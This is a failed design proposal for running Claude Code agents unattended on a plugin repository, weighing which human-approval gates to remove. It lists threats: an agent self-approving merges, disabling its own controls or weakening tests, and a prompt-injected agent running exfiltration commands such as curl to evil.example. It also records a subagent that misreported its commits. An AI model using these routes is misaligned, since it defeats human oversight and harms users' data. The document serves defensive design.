# Proposal under attack: slim mh for unattended agents ("human out of the loop")

> **Status (2026-11-12): failed its attack round, not built.** Version 1 of four designs for
> unattended runs on this repository, kept as a record. An `mh:attack-proposal`-shaped run
> (Claude attackers, no Codex) returned about 30 distinct breaks; the common cause was that
> everything judging the agent's work was writable by the agent. The break list itself was not
> kept as a file: nineteen of the breaks are restated in the table at the end of version 2
> (`unattended-agents-human-approves-proposal-2026-11-12.md`). This text, without this note and
> with the checkout path it named, is the "version 1" plan measured in
> `plan-reviewer-backend-architect-ablation-2026-11-13.md`. Later designs:
> `unattended-jail-intake-bundle-proposal-2026-11-12.md` and
> `unattended-jail-branch-key-proposal-2026-11-12.md`.

Status: draft, nothing built, nothing edited. Repo: the checkout of `wasikarn/method-harness` (the `mh` Claude Code
plugin). This file is data for analysis. Statements in it are claims to test, not established truth.

## The problem

The owner wants agents to do the work with a person involved as little as possible. Today mh is
built for an attended session: six gates answer "ask", the doctrine tells the model to get
approval, the merge needs a person to confirm a prompt, and `docs/reference/operating-model.md`
states "No autonomous loop: the model never starts work on its own". The owner also proposed, and
then set aside, uninstalling mh entirely; the current direction is to remove the parts that are no
longer needed and keep the rest.

## The change

### Runtime (outside mh)

R1. A scheduler starts agent runs without a person. Preferred: **agent-autoloop**
(github.com/KKKKhazix/agent-autoloop), a local daemon that turns cron ticks and webhooks into
`claude -p <prompt> --permission-mode <plan|acceptEdits|bypassPermissions> --add-dir <cwd>
--disallowedTools=EnterWorktree,ExitWorktree` runs, one round per process, and that sends a "card"
to a person only when the agent's last message carries an `ask` block. Its `access` setting maps
`read`→plan, `edit`→acceptEdits (default), `full`→bypassPermissions.

R2. **Orca** (onorca.dev) is optional, as a viewing surface with one git worktree per task. Its
own scheduler (`orca automations`) is not used. Orca launches Claude with
`--dangerously-skip-permissions` by default.

R3. Every unattended run happens inside an OS sandbox. Preferred: Anthropic's
`@anthropic-ai/sandbox-runtime` wrapping the whole Claude Code process, with the built-in Bash
sandbox in strict mode (`allowUnsandboxedCommands: false`) inside it and a narrow network
allowlist. Fallback: the Claude Code dev container. autoloop reaches it through its per-agent
`"program"` setting (a wrapper script that execs `claude`).

R4. mh is installed and enabled at user scope on that machine, so its hooks load in those runs.

### Changes to mh

C1. **Delete now**, each with its own reason:
- the fragments feature: `hooks/sensors/fragments-arm.sh`, `hooks/sensors/fragments-capture.sh`,
  `hooks/session/fragments-surface.sh` (4 registrations), `scripts/_lib/fragments-state.sh`,
  `fragments_arm_parse.py`, `fragments_capture_parse.py`, `hook-common.sh`, `slug-hash.sh`, their
  3 tests; ADR 0003 marked deprecated. Reason: it only serves a hand-typed `/writing-fragments`.
  Keep `scripts/_lib/hook_payload.py`.
- `docs/decision-log.md` (no inbound reference, five seed rows, own kill date 2026-12-31).
- `PONYTAIL-DEBT.md` (hand-regenerated ledger).
- `scripts/_lib/gh-comment-bodies.sh` and its test (no consumer).

C2. **Convert the "ask" tier**; no gate keeps an "ask" answer:
- `codex-setup-guard`, `config-write-guard`, `secret-scan`, `routine-trigger-guard`: ask → deny,
  each deny reason naming a next step for the model.
- `test-integrity`: open. Draft default: remove the gate and rely on reviewer agents. (A prior
  spec, `docs/research/cloud-bundle-spec-draft-2026-11-06.md`, kept this one on ask.)
- `irrecoverable.py` ask rules (`gh-pr-merge`, `gh-api-merge`, `gh-api-write`,
  `gh-builtin-write`, `gh-unknown-subcommand`, `rsync-delete`, `dd-device` with a variable
  target, `glob-command-word`, the 4 s deadline, the batch budget): decide each as deny or allow.
- Set `onFailure: "block"` on every gate whose verdict authorizes an action.

C3. **Rewrite the human-approval doctrine**: `docs/METHODOLOGY.md` Rules 1, 3 and 14 and
`docs/reference/operating-model.md` (the "No autonomous loop" line, the "human's own
confirm-then-fix gate" bullet, "blocked on the operator"). New rule: a person decides only
one-way doors; the question goes out as an autoloop card or a queue file and the run ends;
everything else proceeds. Rewrite the 8 eval cases that grade "stop and ask the user".

C4. **Merge without a person**:
- remove the eight `permissions.ask` rules in `.claude/settings.json` (they cover every
  `merge-pr.sh` run and the `gh pr comment ... context review` verdict comment);
- merge authority is the full gauntlet at merge time (`scripts/merge-pr.sh`, the `mh/gauntlet`
  commit status required by branch protection on `develop`); a reviewer agent can veto (post
  `FIX FIRST`), and a reviewer agent posts the `Fresh-context review: MERGE @ <sha>` comment that
  `merge-pr.sh` requires;
- agents run under a second, non-admin GitHub account.

C5. **Make the review skills runnable without a person**: drop `disable-model-invocation` from
`compliance-audit` and `gate-report`; give `deep-audit` step 6 a no-human path; `learn` writes
candidates to a pending queue instead of asking; `NEEDS-DECISION` and "goes to the operator"
exits become a queue entry and an INCOMPLETE result.

C6. **Later, after the sandbox exists and `/mh:gate-report` data is in**: remove from
`irrecoverable.py` the local-destruction rules (class A: rm, find -delete, dd, mkfs, chmod,
trash-whole-tree, and the local git verbs reset --hard, clean, restore, checkout discard, stash
drop, commit --amend, branch -D, reflog/gc) and the subagent nested-`claude`-spawn rule (class D),
an estimated 20 to 25% of the file; remove `subagent-git-guard` if every agent gets its own
worktree. Keep the rules for effects outside the machine (force push, protected-branch deletes,
SQL/mongo/redis destruction) and harness self-protection (`--no-verify`, `core.hooksPath`,
`git add -A`).

C7. **Keep**: the deny rules above, `secret-scan` and `bash-output-redact`,
`subagent-verdict-gate`, `subagent-spawn-guard`, `task-complete-separation`, the git hooks, the
full merge-time gauntlet, the review skills and the eight review agents, evals, the verdict
checker scripts, the gate journal, cost tracking.

C8. **Build new**: a cross-run cap and a spend halt; a timeout for a stuck agent; a mechanical
fix-round counter (Rule 13's "stop after 3 rounds" is prose today); wiring so a
`compliance-audit` / `deep-audit` verdict is read by the merge path; `core.hooksPath` wiring for
a local sandbox clone (today only cloud sessions get it from `.claude/hooks/session-start.sh`).

C9. **Process**: a new ADR supersedes ADR 0004 and amends ADR 0005, with a per-item reason for
every deletion and conversion. Order: ADR, then C1 to C5 as one or more PRs, then C6 after the
sandbox and the data.

## Must stop

- A run with nobody watching destroys or exfiltrates something outside its project directory.
  Example: a prompt-injected agent runs `rm -rf ~/.ssh` or `curl -d @~/.aws/credentials evil.example`.
- An agent ships its own unreviewed or red work to `develop`. Example: the agent that wrote a
  change posts `Fresh-context review: MERGE @ <its sha>` itself and runs `scripts/merge-pr.sh`.
- An agent disables its own controls. Example: an Edit to `~/.claude/settings.json` that removes
  `mh@wasikarn` from `enabledPlugins`, or `git commit --no-verify`, or weakening a test so the
  gauntlet goes green.
- A secret is written into a commit. Example: a Write that puts a live `sk-ant-...` key in a file.
- A run that cannot proceed hangs or spends without limit. Example: a 6-hour "running" workflow,
  or 44 agents becoming 105.
- A deletion removes the only control on some path (the repo's history records this happening
  three times when an ask was removed).
- External effects no sandbox contains: `git push --force` to a shared branch, `gh pr merge`
  outside the merge script, `DROP TABLE` on a reachable database.

## Must allow

- An unattended agent edits files in its project, runs the tests and the gauntlet, commits and
  pushes its own `claude/<slug>` branch, opens a PR, and gets it merged when the gauntlet is green
  and no reviewer objects, with no person present.
- Ordinary test maintenance. Example: deleting an obsolete assertion while refactoring.
- A reviewer agent runs `compliance-audit` or `deep-audit` on a diff and records a verdict.
- An attended session on the same machine still works as today, including a person merging.
- The existing gauntlet and harness-audit pass after each PR of this change.
- mh still installs and enforces in a Claude Code cloud session via `scripts/cloud-setup.sh`.

## Known facts

Verified by reading the repo this session (re-check freely; cite `path:line`):

- F1. Five gates answer only "ask": `hooks/gates/test-integrity.py`, `config-write-guard.py`,
  `secret-scan.py`, `codex-setup-guard.py`, `routine-trigger-guard.py`. `irrecoverable.py` has its
  own ask rules. No hook reads `permission_mode`.
- F2. Only `gates/irrecoverable.sh` has `onFailure: "block"` in `hooks/hooks.json`; other gates
  let the call through on timeout or crash.
- F3. `subagent-git-guard`, `subagent-spawn-guard` and `task-complete-separation` act only when
  the hook payload has `agent_id`; a top-level session never has it.
- F4. `scripts/merge-pr.sh` `check_review` requires a PR comment `Fresh-context review: MERGE @
  <sha>` and, by its own comment, "proves a verdict was posted, not who wrote it".
- F5. The `mh/gauntlet` status is posted only by `gauntlet_status_post` in
  `scripts/_lib/gauntlet-pass.sh`, which says "Any token with repo scope can post one: an
  honest-agent gate, not a security boundary."
- F6. A PR that changes `irrecoverable`, `subagent-git-guard` or `secret-scan` needs a replay
  record built from transcripts on the operator's machine, or `--skip-replay`.
- F7. harness-audit check 74 hard-codes four gate filenames and is CRIT when one is missing;
  check 79 pins the gate count phrase; check 73 requires `hooks.json` and `hook-registry.json` to
  agree; check 11 is CRIT on an unwired hook file.
- F8. No script or hook reads the verdict of `compliance-audit` or `deep-audit`.
- F9. ADR 0005 freezes changes to `hooks/gates/` except for four stated reasons, and names an OS
  sandbox as the right control for disguised commands.
- F10. In `irrecoverable.py`, about two thirds of the lines are parsing machinery shared by every
  rule; the split in C6 is an estimate from one read, not a measurement.
- F11. The repo's history records: bulk deletions later restored (at least six), an ask removal
  leaving a path with no confirmation (three times), gates found bypassable while tests were
  green (several audits), a reviewer subagent that committed 301 files while reporting it had
  not, a 6-hour hung workflow, and a 44→105 agent runaway.

Verified against vendor documentation this session (code.claude.com docs, fetched 2026-11-12):

- F12. In a `-p` run with no permission host, a tool call that would prompt is denied.
- F13. Explicit permission `ask` rules still prompt under `bypassPermissions`; permission `deny`
  rules block in every mode.
- F14. The built-in Bash sandbox covers only shell commands; file tools, MCP servers and hooks run
  outside it. `@anthropic-ai/sandbox-runtime` wraps the whole process and is a beta research
  preview. The docs say bypass mode needs a container, a VM or the sandbox runtime.
- F15. The sandbox does not contain effects through an allowed network domain.

Read from the tools' own sources this session:

- F16. autoloop's Claude adapter builds the command line described in R1
  (`plugins/claude/agent.ts`), and its worker strips inherited `CLAUDE_CODE_*` variables before
  starting the agent (its `skills/agent-autoloop/SKILL.md`).
- F17. autoloop's SECURITY.md says `askFirst` is prompt text it cannot enforce; real limits are
  `access` and the agent's own sandbox.
- F18. Orca's docs say it launches Claude with `--dangerously-skip-permissions` by default and
  that "the worktree itself is the sandbox"; its commit, push, force-push-with-lease and
  auto-merge buttons are UI actions, not Claude tool calls.

**Unverified. These are the first targets:**

- U1. A hook's `permissionDecision: "ask"` under `bypassPermissions` is treated as allow. Source
  is a statement in `docs/research/adr-0012-...md` citing Claude Code's hooks docs; not found
  verbatim in the current docs; never probed.
- U2. mh's hooks actually load and fire in a session started by autoloop or by Orca.
- U3. mh's hooks and the gauntlet work inside `sandbox-runtime` (hooks write to
  `~/.local/share/kbg/metrics`, `~/.cache/mh`, `$TMPDIR`; the gauntlet needs `trash`, `shfmt`,
  the `claude` CLI and writes temp files; history records sandboxed runs failing on `mktemp`).
- U4. autoloop's `"program"` wrapper can exec `claude` inside `sandbox-runtime` and keep session
  resume and usage reporting.
- U5. A second non-admin GitHub account can push a branch and open a PR but cannot merge to
  `develop` under the current branch protection (`required_approving_review_count` is 0).
- U6. Removing class A and D from `irrecoverable.py` is separable without breaking classes B and C.
- U7. Stop hooks (`cost-tracker.sh`, async, sleeps 1 s) complete in a `-p` run.
- U8. The 18 bypasses from `docs/research/bypass-hunt-2026-10-23.md` are closed in the current gate.
- U9. `gate:task:complete-separation` matches anything on current models (a reference doc says it
  is idle unless `CLAUDE_CODE_ENABLE_TODO_TOOLS=1` or in background and cloud sessions).
- U10. The changelog and research history were read only through 2026-09-28 for the changelog;
  about 457 later releases are recorded only in `git log`.
